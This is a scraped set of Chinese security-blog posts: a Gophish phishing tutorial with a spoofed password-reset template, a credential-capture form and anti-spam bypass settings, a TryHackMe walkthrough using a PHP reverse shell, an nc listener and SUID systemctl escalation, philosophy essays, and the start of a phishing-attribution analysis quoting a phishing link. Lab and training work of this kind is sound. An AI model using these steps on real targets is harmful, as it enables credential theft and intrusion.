style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;修改密码地址：\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;a href=\u0026quot;{{.URL}}\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;https://ucenter.test.com\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;\u0026lt;font style=\u0026quot;vertical-align: inherit;\u0026quot;\u0026gt;{{.Tracker}}\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/font\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  模板变量参考    Variable Description     {{.RId}} The target’s unique ID   {{.FirstName}} The target’s first name   {{.LastName}} The target’s last name   {{.Position}} The target’s position   {{.Email}} The target’s email address   {{.From}} The spoofed sender   {{.TrackingURL}} The URL to the tracking handler   {{.Tracker}} An alias for \u0026lt;img src=\u0026quot;{{.TrackingURL}}\u0026quot;/\u0026gt;   {{.URL}} The phishing URL   {{.BaseURL}} The base URL with the path and rid parameter stripped. Useful for making links to static files.    四、登陆页面 注意，目标网站使用了前端框架的话（例如vue）会导致克隆失败，页面无法显示，需要自己保存网站页面并修改HTML代码，VUE框架由于使用js来触发form动作，需要注释并自己添加from代码。\n\u0026lt;form action=\u0026quot;\u0026quot; autocomplete=\u0026quot;off\u0026quot; class=\u0026quot;ivu-form ivu-form-label-right\u0026quot; enctype=\u0026quot;application/x-www-form-urlencoded\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt;  示例代码：\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026quot;\u0026quot; method=\u0026quot;post\u0026quot; name=\u0026quot;form\u0026quot;\u0026gt;\u0026lt;label\u0026gt;用户名:\u0026lt;/label\u0026gt; \u0026lt;input name=\u0026quot;username\u0026quot; type=\u0026quot;text\u0026quot; /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;label\u0026gt;密码:\u0026lt;/label\u0026gt; \u0026lt;input name=\u0026quot;password\u0026quot; type=\u0026quot;password\u0026quot; /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;input id=\u0026quot;login\u0026quot; name=\u0026quot;login\u0026quot; type=\u0026quot;submit\u0026quot; value=\u0026quot;修改密码\u0026quot; /\u0026gt;\u0026amp;nbsp;\u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  \n 五、邮箱配置 目标使用的是QQ企业邮箱，我这里使用的是QQ域名邮箱，可以直接绕过反垃圾，注意QQ域名邮箱已经下线，目前只有已开通的域名才能使用，而且不能新增成员。\nName: 运维部账号管家\u0026lt;account@test.com\u0026gt; Interface Type: 运维部账号管家\u0026lt;account@test.com\u0026gt; Host: smtp.qq.com:587 Username: account@test.com Password: 123456789abc  \n六、发送钓鱼邮件 1、发件配置 选择你创建的模板，输入钓鱼域名URL，程序在每封邮件内容中插入{{.URL}}变量，并创建一个唯一的id，以便跟踪统计。\n\n\n2、统计面板 \n\n3、记录密码 \n4、重放攻击 \n 七、报表 \n1、报表类型  攻击结果记录 带时间线的原始事件记录  \n2、Goreport Goreport是一个第三方的报表生产脚本，通过Gophish API可以帮你快速生成IP地址、操作系统、浏览器类型、版本、位置信息列表。并导出为execl或者word文档。\n项目地址：https://github.com/chrismaddalena/GoReport\n先创建配置文件，写入Gophish API，其他两项没有可以忽略\ngophish.config\n[Gophish] gp_host: https://127.0.0.1:3333 api_key: \u0026lt;YOUR_API_KEY\u0026gt; [ipinfo.io] ipinfo_token: \u0026lt;IPINFO_API_KEY\u0026gt; [Google] geolocate_key: \u0026lt;GEOLOCATE_API_KEY\u0026gt;  基本用法 python3 goreport.py --id 20 --format excel  程序会自动从接口 https://localhost:3333/api/campaigns/20/?api_key=key 获得统计内容，并将结果输出到xlsx/csv/word文件。\n一次可以导出多个结果ID的统计报告\npython3 goreport.py --id 20,21-25,88 --format csv  合并多个报告\npython3 goreport.py --id 20,21-25,88 --format excel --combine  效果如图：\n\n\n\n\n 八、其他 项目地址：https://github.com/gophish/user-guide/\n用户指南：https://docs.getgophish.com/user-guide/\n接口文档：https://docs.getgophish.com/api-documentation/\n","date":"2020-07-02","permalink":"https://xeye.io/post/gophish%E9%92%93%E9%B1%BC%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/","tags":["红队"],"title":"Gophish钓鱼工具使用教程"},{"content":"推荐阅读书单，通读任意一本受益终身。\n推荐书单：\n一、易家大道根源书 《河图》 《洛书》 《易经》 二、黄老庄道家三圣书之至道四经 《黄帝内经》 《黄帝阴符经》 《道德经》 《庄子》 三、孔孟荀儒家三圣书 《论语》 《易传》 《春秋》 《诗经》 《尚书》 《孟子》 《荀子》 《礼记》 四、管商韩法家三圣书 《管子》 《商君书》 《韩非子》 五、先秦诸圣书 《素书》 《列子》 《黄帝四经》 《吕氏春秋》 《鬼谷子》 《鬼谷子阴符本经七术》 《楚辞》 《离骚》 《汤液经法》 六、中医四大经典 《黄帝内经》 《难经》 《伤寒杂病论》 《神农本草经》 七、兵家之武经七书 《孙子兵法》 《吴子兵法》 《六韬》 《司马法》 《三略》 《尉缭子》 《李卫公问对》 八、春秋三传 《春秋左传》 《春秋公羊传》 《春秋谷梁传》 九、史家绝唱书 《史记》 《汉书》 《后汉书》 《资治通鉴》 十、华夏诸圣贤书 《新语》 《谏迎佛骨表》 《太极图》 《指玄篇》 《无极图》 《张载集》 《朱子语类》 《周易外传》 《黄书》 《尚书引义》 《永历实录》 《春秋世论》 《噩梦》 《宋论》 《中国人的精神》 《毛泽东选集》 十一、明察之书 范文澜《中国通史》 徐大椿《医学源流论》 戚本禹《戚本禹回忆录》 十二、外国书籍 尼采 《悲剧的诞生》《不合时宜的考察》《人性的，太人性的》《漫游者和他的影子》《曙\n光》《快乐的知识》《重估一切价值》《查拉斯图拉如是说》《善恶的彼岸》《道德的谱系》《权力意志》《偶像的黄昏》《看哪，这个人》\n马克思 《德意志意识形态》《共产党宣言》《资本论》《哲学的贫困》\n弗洛伊德 《梦的解析》《图腾与禁忌》《弗洛伊德自传》\n胡塞尔 《现象学方法》《生活世界现象学》《欧洲科学的危机与超越论的现象学》\n海德格尔 《存在与时间》《林中路》《尼采》\n雅斯贝尔斯 《苏格拉底、佛陀、孔子和耶稣》《大哲学家》《悲剧的超越》\n德里达 《马克思的幽灵》《德里达中国讲演录》《解构》\n福柯 《词与物》《临床医学的诞生》《癫狂与文明》\n德勒茲 《千块高原》《反俄狄浦斯》《尼采与哲学》《德勒兹论福柯》\n巴塔耶 《色情史》《色情、耗费与普遍经济》《文学与恶》《爱华妲夫人及其它》\n布朗肖 《文学空间》《从卡夫卡到卡夫卡》《变异的思想》《最后之人》《等待，遗忘》《那没有伴着我的一个》《黑暗托马》《死刑判决》\n马尔库塞 《单向度的人》《爱欲与文明》\n本雅明 《单行道》《迎向灵光消逝的年代》《发达资本主义时代的抒情诗人》《机械复制时代的艺术作品》《经验与贫乏》\n弗洛姆 《健全的社会》《逃避自由》《爱的艺术》《人类的破坏性剖析》\n哈贝马斯 《合法性危机》《包容他者》《后形而上学思想》《恐怖时代的哲学》\n荣格 《寻求灵魂的现代人》《现代灵魂的自我拯救》《让我们重返精神的家园》《人类及其象征》《荣格自传》《原型与集体无意识》《荣格文集》《未发现的自我》《心理学与文学》\n拉康 《镜像阶段》《阅读你的症状》《拉康选集》\n维特根斯坦 《逻辑哲学导论》《论确定性》《哲学研究》《哲学语法》《战时笔记》《文化的价值》《数学基础研究》《关于心理学的最后著作》\n泰勒 《自我的根源》\n卡夫卡 《变形记》《城堡》《审判》《卡夫卡散文》《审判》《美国》\n贝克特 《镇定剂》《等待戈多》《世界与裤子》《无法称呼的人》\n穆奇尔 《没有个性的人》《穆奇尔散文集》\n普鲁斯特 《追忆似水年华》\n加缪 《局外人》《异乡人》《西西弗斯的神话》《鼠疫》\n乔伊斯 《尤利西斯》\n马尔克斯 《百年孤独》《霍乱时期的爱情》\n博尔赫斯 《小径分叉的花园》《红色的旋律》《面前的月亮》《深沉的玫瑰》《梦之书》《沙之书》《虚构集》\n品钦 《万有引力之虹》\n黑塞 《纳尔齐斯与歌尔德蒙》《荒原狼》《东方之旅》《玻璃球游戏》\n契诃夫 《第六病室》\n托尔斯泰 《安娜·卡列尼娜》《战争与和平》《复活》\n陀思妥耶夫斯基 《死屋手记》《卡拉马佐夫兄弟》《罪与罚》《被侮辱的与被损害的》\n布尔加科夫 《大师与玛格丽特》\n劳伦斯 《卡泰莱夫人的情人》《劳伦斯散文集》《不是我，而是风》\n亨利·米勒 《北回归线》《黑色的春天》《马洛西的大石像》\n纳博科夫 《洛丽塔》《微暗的火》《斩首之邀》\n昆德拉 《告别圆舞曲》《好笑的爱》《不能承受的生命之轻》《不朽》《身份》《笑忘录》\n波德莱尔 《异乡人》《恶之花》《巴黎的忧郁》\n兰波 《彩画集》《醉舟》《地狱一季》《全蚀狂爱》（电影）《兰波作品集》\n里尔克 《杜伊诺哀歌》《献给奥尔甫斯的十四行诗》《里尔克诗选》\n荷尔德林 《荷尔德林诗选》\n保罗·策兰 《保罗·策兰诗选》\n麦克卢汉 《理解媒介》《机器新娘》《谷登堡星汉璀璨》《麦克卢汉如是说》\n鲍德里亚 《媒介的挽歌》《生产之镜》《消费社会》《生产之镜》《完美的罪行》《物的体系》《幻觉的终结》《拟像与模拟》《象征性消费与死亡》《美国》\n施特劳斯 《忧郁的热带》《新结构人类学》《野性的思维》《种族与历史》\n罗蒂 《偶然》\n","date":"2020-06-29","permalink":"https://xeye.io/post/%E9%81%93%E6%98%8E%E5%90%9B%E6%8E%A8%E8%8D%90%E4%B9%A6%E5%8D%95/","tags":["阅读"],"title":"道明君推荐书单"},{"content":" 有人看了《庄子》，就认为庄子是书里描写的那样，是个吃米都得找人借的穷光蛋。认为他出身卑微，一生穷困潦倒，实际上并不是这样。那只是书里面写的寓言，不能把寓言当现实。\n  庄子是个什么样的人？ 庄子是楚国人，居住在楚国蒙地，蒙地就是今天的安徽蒙城县。庄子曾经的职业是做蒙地的漆园吏。有人说庄子是宋国人，这是毫无根据的结论。首先，宋国不是当时的学术中心，不具备产生圣人的文化土壤。其次，宋国的漆器根本不发达，没有产业的驱动，不可能产生庞大的原材料生产基地。\n再次，宋国是商朝遗民，在周朝，宋人一直备受天下人讥讽，只有宋人不讥讽自己。庄子在书里，对宋人的讥讽十分辛辣，显然庄子不会是宋人。那时候如果要讲一个傻子的故事，通常开篇都是说，从前有个宋人。\n以此三点来反观楚国，更能说明庄子是楚国人，而不是宋人。首先，楚国是当时的文化和学术中心。不仅产生了庄子这样的圣人，还产生了老子和屈原这样的大圣人。其次，楚国的漆器艺术和产业是当时最发达和繁荣的，所以才有很多的漆园。再次，庄子对楚国是充满褒扬之心的。庄子在逍遥游开篇就讲图南之志，这就是楚国文化所特有的对凤凰的崇拜。中原文化，更多的是崇拜龙。\n对庄子的另一个误解是，认为漆园吏是一个微不足道的小官。实际上，漆器是楚国的战略产业，是当时天下最名贵最高端的奢饰品。它既代表了当时艺术审美的巅峰，也是楚国皇家御用品，同时还是楚国出口的支柱产品。所以说，漆园吏非但不是无足轻重的小官，还是掌管楚国战略资源的重要官员。\n为什么这么重要的职位，会让庄子来负责呢？因为庄子是楚国贵族，和楚国国君是亲戚。庄子是楚庄王的后人，庄子的姓氏，就来自楚庄王的谥号庄字。以祖上的谥号为姓氏，庄姓的源头就出自楚国。有人看了《庄子》，就认为庄子是书里描写的那样，是个吃米都得找人借的穷光蛋。认为他出身卑微，一生穷困潦倒，实际上并不是这样。那只是书里面写的寓言，不能把寓言当现实。\n看到这里，是不是很多人觉得有些诧异，楚人不是蛮夷吗？怎么会成为当时的学术和文化中心呢？实际上，楚人非但不是蛮夷，还是三皇时期就根正苗红的中原华夏族人。华夏族是汉族在汉朝之前的称谓。商代夏之后，商人把楚人从中原驱逐了出去。还蔑称楚人是蛮夷。后来周代商，赶走了商人，楚人也是武王伐纣的盟友之一。立了功的楚人觉得，自己终于可以回归中原了。但是周人并没有把楚人封在中原，而是视楚人为蛮夷，怠慢了楚人。\n周王室没有把楚人迁回中原，只给楚国封了一个子爵，这是当时所有诸侯国里面最低级的一个爵位，封地也只有五十平方公里，这就是楚国最开始的建国基础。后来楚国人一直奋发图强，就是为了能提高自己的尊位。到了楚武王的时候，楚武王攻打随国。大家都很愤怒，因为依据周礼，不可攻伐无罪之国。楚武王之所以这么做，就是为了让周天子能够提高自己的爵位。但是周王室拒绝了楚国。愤怒的楚武王发出了震惊天下的一句话：“王不加位，我自尊耳。”\n楚武王，把自己的三个儿子都封了王，这样楚和周成了并立的两个王朝。自立为王是楚国命运的一个大转折点。周王室内乱，王子朝奔楚，则是楚国文化和学术兴盛，并使楚国成为文化中心的重大的转折点。\n综上可见，当年楚人南奔，保留下来了很多上古三皇时期的文化火种。从老庄的书里，可以看出来浓厚的三皇之学的底蕴。周朝官学的长期辐射和影响，使得楚国的文化学术逐步繁荣，老子做周王室史官，得以学习继承古圣之道。王子朝携带周室典籍奔楚后，楚国便成为当时的天下文化和学术中心。这便是老庄之道的源流和传承。\n","date":"2020-04-07","permalink":"https://xeye.io/post/%E9%97%B2%E8%AF%9D%E5%BA%84%E5%AD%90%E4%B8%80%E5%BA%84%E5%AD%90%E5%85%B6%E4%BA%BA/","tags":["阅读"],"title":"闲话庄子：一、庄子其人"},{"content":"在庄子看来，生，只是一段插曲。\n你来自于无，又归于无。死亡，就像是回家。所以，有视死如归之说。和漫长的虚无相比，生就是一次微不足道的火花，转瞬即逝。\n等你死后，回到家里。回想起你生着的那段时间，感觉仿佛是被人从家里扔了出去一样。如同你现在认为，死亡会把你的生命抛出去一样。\n对于死亡的恐惧，只是归乡情怯。把虚无理解为死亡，是不美好的。它生了你，又回收你，其实它就是你本来的样子。只是你不知道。\n庄子的妻子死后，庄子鼓盆而歌，并不是因为庄子神经病，而是他视死如归。 那么庄子的高度到底如何呢，庄子达到的高度就是《庄子•天下篇》中描述的那样\n “上与造物者游，而下与外生死无终始者为友。独与天地精神相往来”。\n 与造物主牵着手一起看夕阳，这大概就是道家的终极追求了。\n","date":"2020-04-07","permalink":"https://xeye.io/post/%E9%97%B2%E8%AF%9D%E5%BA%84%E5%AD%90%E4%BA%8C%E5%BA%84%E5%AD%90%E7%9A%84%E7%94%9F%E6%AD%BB%E8%A7%82/","tags":["阅读"],"title":"闲话庄子：二、庄子的生死观"},{"content":"0x00 前言\n  靶机名称：Vulnversity\n  靶机简介：Vulnversity靶机主要学习主动侦查扫描，Web应用攻击和suid提权。\n  攻击路径：端口扫描\u0026ndash;\u0026gt;Web目录爆破\u0026ndash;\u0026gt;文件上传漏洞利用\u0026ndash;\u0026gt;权限提升\n  相关工具：nmap、gobuster、burpsuite、nc、webshell\n  难度：容易\n  0x01 侦查\n1.nmap 扫描\nnmap -sV -sC -T4 -A 10.10.137.247 -oA 10.10.137.247.nmap ☁ vulnversity nmap -sV -sC -T4 -A 10.10.137.247 -oA 10.10.137.247.nmap Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-19 19:39 CST Nmap scan report for 10.10.137.247 Host is up (0.26s latency). Not shown: 972 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA) | 256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA) |_ 256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 163/tcp filtered cmip-man 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 625/tcp filtered apple-xsrvr-admin 1001/tcp filtered webpush 1070/tcp filtered gmrupdateserv 1147/tcp filtered capioverlan 3128/tcp open http-proxy Squid http proxy 3.5.12 |_http-server-header: squid/3.5.12 |_http-title: ERROR: The requested URL could not be retrieved 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Vuln University 3871/tcp filtered avocent-adsap 3878/tcp filtered fotogcad 4449/tcp filtered privatewire 5225/tcp filtered hp-server 6106/tcp filtered isdninfo 7002/tcp filtered afs3-prserver 8181/tcp filtered intermapper 8193/tcp filtered sophos 8652/tcp filtered unknown 9502/tcp filtered unknown 10012/tcp filtered unknown 14441/tcp filtered unknown 15002/tcp filtered onep-tls 15003/tcp filtered unknown 27352/tcp filtered unknown 49155/tcp filtered unknown 64623/tcp filtered unknown No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=3/19%OT=21%CT=1%CU=32906%PV=Y%DS=2%DC=T%G=Y%TM=5E735A2 OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS( OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11 OS:NW7%O6=M54DST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN( OS:R=Y%DF=Y%T=40%W=6903%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 1h20m22s, deviation: 2h18m34s, median: 21s |_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: vulnuniversity | NetBIOS computer name: VULNUNIVERSITY\\x00 | Domain name: \\x00 | FQDN: vulnuniversity |_ System time: 2020-03-19T07:40:44-04:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-19T11:40:44 |_ start_date: N/A TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 539.50 ms 10.9.0.1 2 539.58 ms 10.10.137.247 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 53.95 seconds  2. 查看端口开放服务和数量\ngrep \u0026quot;open\u0026quot; 10.10.137.247.nmap.nmap 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) grep \u0026quot;open\u0026quot; 10.10.137.247.nmap.nmap |wc -l 6  0x02 Web目录爆破\nobuster项目地址：https://github.com/OJ/gobuster gobuster dir -u http://10.10.137.247:3333/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  发现上传页面\nhttp://10.10.137.247:3333/internal/  \n\n0x03 穷举上传文件扩展名\n\n\n设置Content-Type类型为php\nContent-Type: application/x-php  取消URL默认编码（Payload文件名中的\u0026rdquo;.\u0026ldquo;被URL编码会导致访问失败）\nBurpsuite --\u0026gt; Intruder --\u0026gt; Payloads --\u0026gt; Payload Encoding --\u0026gt; BurpsuitePayload Encoding  \n发现可以上传.phhtm\n\n0x04 上传Webshell wget https://github.com/pentestmonkey/php-reverse-shell/raw/master/php-reverse-shell.php -O php-reverse-shell.phtml  反弹IP修改为本机（攻击机）\n\n\n0x04 反弹shell 本机NC监听1234端口\n nc -lvnp 1234  访问后门后获得shell，flag在用户目录下\n$ cat /home/bill/user.txt 8bd7992fxxxxxxxxxxxxxxxxxxxxxx  \n0x04 提权 利用SUID提权，搜索所有SUID文件\n\n$ find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah -rwsr-xr-x 1 root root 31K Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 40K May 16 2018 /bin/mount -rwsr-xr-x 1 root root 139K Jan 28 2017 /bin/ntfs-3g -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 40K May 16 2017 /bin/su -rwsr-xr-x 1 root root 645K Feb 13 2019 /bin/systemctl -rwsr-xr-x 1 root root 27K May 16 2018 /bin/umount -rwsr-xr-x 1 root root 35K Mar 6 2017 /sbin/mount.cifs -rwsr-sr-x 1 daemon daemon 51K Jan 14 2016 /usr/bin/at -rwsr-xr-x 1 root root 49K May 16 2017 /usr/bin/chfn -rwsr-xr-x 1 root root 40K May 16 2017 /usr/bin/chsh -rwsr-xr-x 1 root root 74K May 16 2017 /usr/bin/gpasswd -rwsr-xr-x 1 root root 33K May 16 2017 /usr/bin/newgidmap -rwsr-xr-x 1 root root 39K May 16 2017 /usr/bin/newgrp -rwsr-xr-x 1 root root 33K May 16 2017 /usr/bin/newuidmap -rwsr-xr-x 1 root root 53K May 16 2017 /usr/bin/passwd -rwsr-xr-x 1 root root 23K Jan 15 2019 /usr/bin/pkexec -rwsr-xr-x 1 root root 134K Jul 4 2017 /usr/bin/sudo -rwsr-xr-- 1 root messagebus 42K Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 27 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 419K Jan 31 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 15K Jan 15 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-sr-x 1 root root 97K Jan 29 2019 /usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 75K Jul 17 11:22 /usr/lib/squid/pinger -rwsr-xr-x 1 root root 3  \n我们看到靶机系统允许所有登陆用户创建系统服务并以root权限运行，systemctl用于控制systemd初始化服务的工具。\nxxx=$(mktemp).service //创建一个名为xxx的环境变量，调用mktemp创建一个临时的systemd服务配置文件 echo '[Service] ExecStart=/bin/sh -c \u0026quot;cat /root/root.txt \u0026gt; /tmp/output\u0026quot; [Install] WantedBy=multi-user.target' \u0026gt; $xxx //将配置内容写入环境变量，服务执行后通过root权限去读flag文件。 /bin/systemctl link $xxx /bin/systemctl enable --now $xxx //链接服务并启动 cat /tmp/output a58ffxxxxxxxxxxxxxxxxxxx //获得root flag  \nsystemctl提权参考GTFOBins项目文章：https://gtfobins.github.io/gtfobins/systemctl/#suid\n","date":"2020-04-03","permalink":"https://xeye.io/post/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95tryhackme-vulnversity/","tags":["靶机"],"title":"靶机渗透测试 TryHackMe:Vulnversity"},{"content":" 声明：本文曾经发表在FreeBuf，文章分享的思路与方法仅供信息安全同行研究，请勿用于非法。\n 一、前言 近日朋友收到一封来自海外的钓鱼邮件，委托我帮忙分析。因此我对钓鱼者身份和攻击路径进行了一次详细的溯源。大致摸清了攻击者组织身份、攻击手法以及动机。本次溯源工作主要是通过提取攻击者控制的肉鸡服务器、网站访问日志、攻击者后门特征等。关联分析这些日志和特征最终得到攻击者的身份信息。本文以流水账的方式，详细记录整个溯源过程，包括分析手法和思路，以供安全研究人员参考。\n 二、信息收集 这是一封冒充 Microsoft Outlook WebApp 密码过期的钓鱼邮件：\n2.1 邮件正文： Received: from sysmailout1.platon.sk (unknown [85.248.228.17]) by bizmx16.qq.com (NewMx) with SMTP id for \u0026lt;test@test.cn\u0026gt;; Thu, 29 Nov 2018 06:56:41 +0800 X-QQ-SPAM: true X-QQ-FEAT: jfJxHuYZxOCSeMM7azx75jXNlqmrApsudtGuMpkas54ZAC17UV7M4b/R5+7i0 PKMg4QGPsKjsZDM+XUXd0s8kb9W0jCArNfxa3+HTU9vKECwH9fbHyzA2+de0ctDM9+ziJ5w 1BJI2Ppc9DVh5DYSq8ySLhcBVRj6sBsJefxrSztWrgzKi58wWFCv7LPgqOAXS+VVMyVipbT fHFacZXmdB00T62nXv8xQociZvHE+8ELBoHVgcA3ZWA7p4no8o1e0Z8ShUvX2P5FwhvXPLZ QUg8HNiMhXk5NEtQVC0Y7R9JwKV2VeKybQbg== X-QQ-MAILINFO: Mms3jrkBGwMrz972clMUbgsPqZ0t5EGjrqWV2rMFcEfTT5Y9lunbPCtSM 4HaaK+iUBVTvuth5bvdEvVKkuiTcOnkJ0t3khnTYcRGfQmEIZI+ZrNXlT/8QxjWMjOsiHkK yGbgfv5Gx9Qr65abnNzXymg= X-QQ-mid: bizmx16t1543445804ti4ex7suw X-QQ-CSender: www-data@m7web1.platon.sk X-QQ-ORGSender: www-data@m7web1.platon.sk X-KK-mid:bizmxp6t1543445804t9ne878su Received: from m7web1.platon.sk (m7web1.platon.sk [85.248.229.150]) by sysmailout1.platon.sk (Postfix) with ESMTP id 8EFCC217002E for \u0026lt;test@test.cn\u0026gt;; Wed, 28 Nov 2018 23:56:38 +0100 (CET) Received: by m7web1.platon.sk (Postfix, from userid 33) id 89364400A3A1; Wed, 28 Nov 2018 23:56:38 +0100 (CET) To: test@test.cn Subject: =?UTF-8?Q?Password_expiry_notice?= Date: Wed, 28 Nov 2018 23:56:38 +0100 From: =?UTF-8?Q?Microsoft_Online_Services_Team?= \u0026lt;no-response@365.mirohaviar.sk\u0026gt; Message-ID: \u0026lt;0a9ee06dc11866565f0302302c647c7a@www.mirohaviar.sk\u0026gt; X-Priority: 3 MIME-Version: 1.0 Content-Transfer-Encoding: quoted-printable Content-Type: text/html; charset=\u0026quot;us-ascii\u0026quot; 略... \u0026lt;br\u0026gt;The password for the Microsoft 365 account\u0026lt;span style=3D\u0026quot;font-weight: b= old;\u0026quot;\u0026gt; test@test.cn \u0026lt;/span\u0026gt; has expired.\u0026lt;br\u0026gt;![mir-nc.png-57.1kB][2] \u0026lt;span class=3D\u0026quot;Apple-converted-space\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;br\u0026gt;To protect your Microsoft = account, your existing password may cease to work shortly.\u0026lt;br\u0026gt; \u0026lt;br\u0026gt; You are now required to \u0026lt;span class=3D\u0026quot;Apple-converted-space\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;a hre= f=3D\u0026quot;http://www.rosturplast.com/shells/logon.secureaccess/?ml=3Dtest@= test.cn \u0026quot;\u0026gt;\u0026lt;span style=3D\u0026quot;font-weight: bold;\u0026quot;\u0026gt;change your password\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; immediateIy.\u0026lt;span class=3D\u0026quot;Apple-converted-space\u0026quot;\u0026gt; \u0026lt;br\u0026gt; =2E\u0026lt;/span\u0026gt;\u0026lt;br\u0026gt; \u0026lt;a href=3D\u0026quot;http://www.rosturplast.com/shells/logon.secureaccess/?ml=3Dtest=@test.cn 略...  2.2 分析邮件内容 根据邮件内容得到的信息如下：\n 钓鱼网站： [www.rosturplast.com（137.74.81.5 法国）\n钓鱼链接: http://www.rosturplast.com/shells/logon.secureaccess/?ml=test@test.cn\n发件地址： no-response@365.mirohaviar.sk\n服务商： Platon Technologies, s.r.o （斯洛伐克） SMTP： sysmailout1.platon.sk （85.248.228.17 斯洛伐克）\n  三、渗透钓鱼网站 3.1 漏洞分析  目标网站：www.rosturplast.com\n 